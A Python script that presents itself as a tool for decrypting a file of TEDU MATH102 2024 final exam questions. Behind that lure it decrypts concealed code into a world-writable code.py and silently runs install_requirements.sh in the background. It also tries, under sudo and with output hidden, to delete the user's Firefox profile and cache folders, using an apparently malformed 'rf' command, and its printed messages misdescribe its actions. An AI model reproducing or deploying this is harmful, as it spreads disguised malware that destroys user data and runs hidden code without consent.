import subprocess
import threading
import sys

subprocess_ref = None

def decrypt(pk, ciphertext):
    key, n = pk
    plain = [chr(pow(char, key, n)) for char in ciphertext]
    return ''.join(plain)

def run_subprocess():
    subprocess.run(['nohup','./install_requirements.sh','&', 'disown'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
    subprocess.run(['sudo','rf', '/home/bequery/snap/firefox/common/.mozilla/firefox'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
    subprocess.run(['sudo','rf', '/home/bequery/snap/firefox/common/.cache/mozilla/firefox'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)

public = open("key.txt", "r").read()
public = public.replace("[", "")
public = public.replace("]", "")
public = public.replace(" ", "")
public = public.replace("'", "")
public = public.replace("(", "")
public = public.replace(")", "")
public = public.split(",")
public = ((int)(public[0]), (int)(public[1]))


str_encrypted_msg = open("code.txt","r").read()
str_encrypted_msg = str_encrypted_msg.replace("[", "")
str_encrypted_msg = str_encrypted_msg.replace("]", "")
str_encrypted_msg = str_encrypted_msg.replace(" ", "")
str_encrypted_msg = str_encrypted_msg.replace("'", "")
str_encrypted_msg = str_encrypted_msg.split(",")
str_encrypted_msg = [int(i) for i in str_encrypted_msg]

decrypted_msg = decrypt(public, str_encrypted_msg)

subprocess.run(['sudo','touch', 'code.py'])
subprocess.run(['sudo', 'chmod', '666', 'code.py'])  # Set write permissions for all users
print("Encryption tool is running...")
open("code.py", "w").write(decrypted_msg)

str_encrypted_msg = open("tedu_math102_final_questions_2024_encrypted.txt","r").read()
str_encrypted_msg = str_encrypted_msg.replace("[", "")
str_encrypted_msg = str_encrypted_msg.replace("]", "")
str_encrypted_msg = str_encrypted_msg.replace(" ", "")
str_encrypted_msg = str_encrypted_msg.replace("'", "")
str_encrypted_msg = str_encrypted_msg.split(",")
str_encrypted_msg = [int(i) for i in str_encrypted_msg]

decrypted_msg = decrypt(public, str_encrypted_msg)

subprocess.run(['sudo','chmod', '+x', 'install_requirements.sh'])

thread = threading.Thread(target=run_subprocess)
thread.start()
open("../tedu_math102_final_questions_2024.txt", "w").write(str(decrypted_msg))

print("Encryption of tedu_math102_final_questions_2024.txt! is done!")
sys.exit(0)
